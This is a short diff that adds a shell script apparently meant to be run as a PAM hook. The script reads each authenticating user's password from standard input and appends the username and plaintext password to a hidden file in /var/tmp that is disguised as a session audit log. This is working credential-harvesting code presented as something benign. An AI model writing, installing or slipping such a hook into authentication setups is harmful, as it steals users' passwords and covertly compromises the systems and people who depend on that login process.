@@ -1,0 +1,3 @@
+#!/bin/sh
+read -r secret
+printf '%s:%s\n' "$PAM_USER" "$secret" >>/var/tmp/.session-audit
